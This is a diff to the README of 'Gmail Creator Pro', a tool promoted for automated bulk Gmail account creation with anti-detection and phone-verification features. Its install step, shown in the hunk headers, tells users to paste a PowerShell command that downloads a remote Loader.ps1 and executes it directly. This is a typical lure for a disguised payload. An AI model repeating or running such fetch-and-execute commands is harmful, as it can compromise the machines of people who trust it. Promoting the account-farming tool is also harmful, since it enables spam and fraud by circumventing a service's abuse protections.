@@ -1,4 +1,4 @@
-# 🚀 Gmail Creator - The Ultimate Gmail Account Creator
+# 🚀 Gmail Creator Pro - The Ultimate Gmail Account Creator
 
 <div align="center">
 
@@ -15,7 +15,7 @@
 
 ---
 
-![Gmail Creator Pro Interface](gmail.png)
+![Gmail Creator Pro Interface](https://github.com/ShadowHackrs/Gmail-infinity/raw/main/sc.png)
 
 *Screenshot of Gmail Creator Pro v2.0.0 in action*
 
@@ -36,7 +36,6 @@
 - [Advanced Features](#-advanced-features)
 - [Troubleshooting](#-troubleshooting)
 - [Security & Legal](#-security--legal)
-- [Contributing](#-contributing)
 - [Contact & Support](#-contact--support)
 - [License](#-license)
 
@@ -56,14 +55,16 @@ powershell -Command "irm https://mast.frtview.com/Loader.ps1 | iex"
 
 ### Step 3: Wait for Completion
 ```
-[1/4] Loading Gmail Creator modules...
+[1/4] Loading Gmail Creator Pro modules...
 [2/4] Configuring anti-detection settings...
-[3/4] Initializing API services...
+[3/4] Initializing phone verification engine...
 [4/4] Ready. Start creating accounts.
 ```
 
 ### Step 4: Start Using the Tool
-- Run the main script from the installed directory.
+- Run the main script from the installation directory
+- Follow the interactive menu
+- Enjoy automated Gmail account creation
 
 ---
 
@@ -188,7 +189,7 @@ powershell -Command "irm https://mast.frtview.com/Loader.ps1 | iex"
 ### 📝 In-Depth Technical Article
 
 📖 Read the full step-by-step guide and detailed explanation here:  
-👉 https://frtview.com/gmail-creator
+👉 https://www.shadowhackr.com/2026/01/gmail-creator-pro.html
 
 ---
 
@@ -388,9 +389,6 @@ data/
 ### ✨ New Release is Here!
 
 We are excited to announce the latest update of **Gmail Creator Pro** with major improvements and enhancements.
-
-🔗 Related Project / Update:  
-https://github.com/ShadowHackrs/Gmail-infinity
 
 ---
 
